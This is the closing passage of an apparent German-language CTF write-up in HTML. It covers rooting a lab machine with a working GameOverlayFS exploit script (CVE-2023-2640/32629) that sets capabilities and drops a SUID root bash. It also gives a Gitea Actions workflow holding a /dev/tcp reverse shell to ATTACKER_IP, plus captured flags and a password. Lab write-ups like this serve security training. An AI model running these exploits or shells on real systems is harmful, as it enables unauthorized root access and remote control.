+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;
+mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;
+" && u/python3 -c 'import os;os.setuid(0);
+os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
+</pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">dev@run$</span> <span class="command">cd /tmp</span></pre>
+                       <pre><span class="prompt">dev@run:/tmp$</span> <span class="command">nano ex.sh</span></pre> <!-- Inhalt ist das Skript oben -->
+                       <pre><span class="prompt">dev@run:/tmp$</span> <span class="command">chmod +x ex.sh</span></pre>
+                   </div>
+               </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer findet ein Shell-Skript (`exploit.sh` von g1vi) für die GameOverlayFS-Schwachstelle (CVE-2023-2640 / CVE-2023-32629), die auf den identifizierten Kernel passt. Dieses Skript nutzt Namespaces (`unshare`) und OverlayFS-Mounts, um eine Situation zu schaffen, in der `setuid(0)` erfolgreich aufgerufen werden kann, um Root-Rechte zu erlangen. Der Exploit kopiert die `/bin/bash`, setzt das SUID-Bit darauf (`chmod 4755 /var/tmp/bash`) und führt diese SUID-Bash-Kopie aus (`/var/tmp/bash -p`). Das Skript wird lokal als `ex.sh` gespeichert und ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein bekannter und oft funktionierender Exploit für die Ziel-Kernel-Version. Er erfordert keine Kompilierung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Skript `./ex.sh` aus.<br/><strong>Empfehlung (Admin):</strong> **Patchen Sie den Kernel!** Dies ist die einzige zuverlässige Methode, um Kernel-Exploits zu verhindern.</p>
+
+        </section>
+
+        <!-- Proof of Concept Abschnitt für Kernel Exploit -->
+        <section id="poc-kernel">
+            <h2>Proof of Concept: Kernel Exploit (CVE-2023-2640/32629)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach dem Zugriff auf das Host-System als Benutzer `dev` wurde festgestellt, dass der laufende Kernel (`6.2.0-20-generic`) anfällig für die GameOverlayFS-Schwachstelle (CVE-2023-2640 / CVE-2023-32629) ist. Ein öffentlich verfügbarer Exploit in Form eines Shell-Skripts wird verwendet, um diese Schwachstelle auszunutzen und Root-Rechte auf dem Host-System zu erlangen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als unprivilegierter Benutzer (hier `dev`) auf dem Host-System, anfälliger Kernel (Ubuntu 6.2.0-20), Exploit-Skript (`ex.sh`).</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Kernel-Version prüfen (`uname -r`).
+                2. Passenden Exploit für CVE-2023-2640/32629 herunterladen oder erstellen (z.B. `ex.sh` von g1vi).
+                3. Exploit ausführbar machen (`chmod +x ex.sh`).
+                4. Exploit ausführen (`./ex.sh`).
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Das Exploit-Skript nutzt die Kernel-Schwachstelle aus, um eine SUID-Root-Shell (`/var/tmp/bash`) zu erstellen und auszuführen. Der Angreifer erhält eine Shell mit Root-Rechten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">dev@run:/tmp$</span> <span class="command">./ex.sh</span></pre>
+                     <pre>
+[+] You should be root now
+[+] Type 'exit' to finish and leave the house cleaned
+<span class="prompt">root@run:/tmp#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=1000(dev) groups=1000(dev)</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Exploit-Skript `ex.sh` wird ausgeführt. Die Ausgabe "[+] You should be root now" und der anschließende `id`-Befehl, der `uid=0(root)` zeigt, bestätigen den Erfolg. Der Exploit hat eine Root-Shell bereitgestellt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff auf dem Host-System erfolgreich erlangt!** Der Kernel-Exploit war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Holen Sie die Root-Flag. Dokumentieren Sie den Erfolg des Kernel-Exploits.<br/><strong>Empfehlung (Admin):</strong> **Dringend Kernel patchen!** Isolieren Sie das System, untersuchen Sie es auf weitere Kompromittierungen und spielen Sie Updates ein.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">root@run:/tmp#</span> <span class="command">cd ~</span></pre> <!-- Wechselt ins Home von root (/root) -->
+                      <pre><span class="prompt">root@run:~#</span> <span class="command">ls</span></pre> <!-- Korrigierter Prompt -->
+                      <pre>user.txt</pre> <!-- Fehler im Original? user.txt sollte nicht in /root liegen -->
+                      <pre><span class="prompt">root@run:~#</span> <span class="command">cd /root/</span></pre>
+                      <pre><span class="prompt">root@run:/root#</span> <span class="command">cat root.txt</span></pre>
+                      <pre><span class="password">008b138f906537f51a5a5c2c69c4b8a2</span></pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Als Root auf dem Host wird ins Root-Home-Verzeichnis (`/root`) gewechselt. Dort wird die Datei `root.txt` gefunden und ihr Inhalt ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag ist `<span class="password">008b138f906537f51a5a5c2c69c4b8a2</span>`.</p>
+
+              <p class="analysis"><strong>Analyse:</strong> Die User-Flag wurde zuvor im Exploit-Text als Inhalt der Datei `/home/dev/user.txt` identifiziert, nicht in `/root` oder `/srv/ftp` wie bei der vorherigen Maschine.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">dev@run$</span> <span class="command">cat user.txt</span></pre> <!-- Ausgeführt als dev vor dem Exploit -->
+                      <pre><span class="password">56f98bdfaf5186243bc4cb99f0674f58</span></pre>
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `user.txt` im Home-Verzeichnis von `dev` wird angezeigt.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag ist `<span class="password">56f98bdfaf5186243bc4cb99f0674f58</span>`.</p>
+
+
+        </section>
+
+        <section id="poc-gitea">
+            <h2>Proof of Concept: Gitea Actions RCE</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach Kompromittierung des JWT Secret Keys (`developer88`) des Gitea-Benutzers `dev` durch Auslesen der Git-Historie war es möglich, sich als `dev` anzumelden oder dessen Session zu übernehmen. Im Gitea-Webinterface wurde ein neues Repository (`revshell`) erstellt und Gitea Actions dafür aktiviert. Anschließend wurde ein Workflow (`.gitea/workflows/shell.yaml`) erstellt und in das Repository gepusht. Dieser Workflow enthielt einen Befehl zum Aufbau einer Reverse Shell.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff auf einen Gitea-Account mit Rechten zum Erstellen von Repositories und Aktivieren von Actions (hier `dev` über kompromittierten Key), Gitea Actions müssen auf der Instanz aktiviert sein und ein Runner verfügbar sein.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Anmelden bei Gitea als `dev` (Passwort `developer88` oder via manipuliertem JWT).
+                2. Neues Repository `revshell` erstellen.
+                3. In den Repository-Einstellungen "Actions" aktivieren.
+                4. Lokales Git-Repository initialisieren.
+                5. Workflow-Datei `.gitea/workflows/shell.yaml` mit Reverse-Shell-Payload erstellen:
+                   ```yaml
+                   name: ReverseShell
+                   on: [push]
+                   jobs:
+                     GetShell:
+                       runs-on: ubuntu-latest # oder Runner-Name
+                       steps:
+                         - run: /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+                   ```
+                6. Listener auf `ATTACKER_IP:PORT` starten (`nc -lvnp PORT`).
+                7. Workflow-Datei committen und zum Gitea-Repository pushen (`git add .`, `git commit -m "trigger action"`, `git push origin main`).
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Push löst den Workflow aus. Der Gitea-Runner führt den `run`-Befehl aus und verbindet sich zurück zum Netcat-Listener des Angreifers, wodurch eine Shell (als Benutzer `act` im Runner-Kontext) bereitgestellt wird.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Ermöglicht Remote Code Execution im Kontext des Gitea-Runners, was oft zu weiterer Eskalation innerhalb des Systems oder Netzwerks führt.<br/><strong>Empfehlungen:</strong> Gitea aktuell halten, JWT Secrets sicher verwalten (nicht in Git!), Gitea Actions restriktiv konfigurieren oder deaktivieren, Runner sicher und isoliert betreiben.</p>
+        </section>
+
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/dev/user.txt</div>
+                     <div class="flag-value"><span class="password">56f98bdfaf5186243bc4cb99f0674f58</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">008b138f906537f51a5a5c2c69c4b8a2</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. März 2024</p>
+    </footer>
+</body>
+</html>
